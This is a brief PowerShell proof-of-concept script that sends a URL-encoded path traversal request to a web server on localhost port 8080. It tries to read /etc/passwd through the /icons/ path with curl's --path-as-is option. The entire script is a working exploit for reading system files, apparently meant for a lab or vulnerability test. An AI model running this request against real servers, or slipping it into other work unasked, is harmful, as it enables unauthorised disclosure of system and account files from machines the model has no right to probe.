$ErrorActionPreference = "Stop"

$target = "http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
Write-Host "Sending path traversal request to $target"
curl.exe -i --path-as-is $target

